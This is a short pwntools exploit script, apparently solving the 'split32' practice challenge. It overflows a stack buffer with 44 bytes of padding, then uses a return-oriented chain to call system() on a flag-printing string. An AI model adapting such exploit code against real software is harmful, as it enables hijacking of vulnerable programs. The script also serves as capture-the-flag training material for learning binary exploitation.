from pwn import *

pipe = process("./split32")

print(pipe.recvuntil("> "))

syscall = 0x080483e0
flag_string = 0x0804A030

payload = "A" * 44
payload += p32(syscall)
payload += p32(0xdeadbeef)
payload += p32(flag_string)

pipe.sendline(payload)
print(pipe.recvall())